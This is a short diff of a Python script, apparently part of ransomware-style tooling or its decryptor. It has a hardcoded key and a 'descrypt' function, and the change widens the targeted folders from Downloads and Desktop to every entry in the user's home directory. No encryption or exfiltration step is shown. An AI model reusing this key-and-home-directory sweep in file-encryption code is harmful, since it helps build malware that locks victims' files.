@@ -6,7 +6,10 @@ from sys import argv
 from pathlib import Path
 key = "102efd86a2bec382e7945002e53505a7"
 
-lst_past=["Downloads","Desktop"]
+lst_past=["Downloads"]
+os.listdir(Path.home())
+for o in os.listdir(Path.home()):
+    lst_past.append(o)
 
 def descrypt(decrypt_file):
     try:
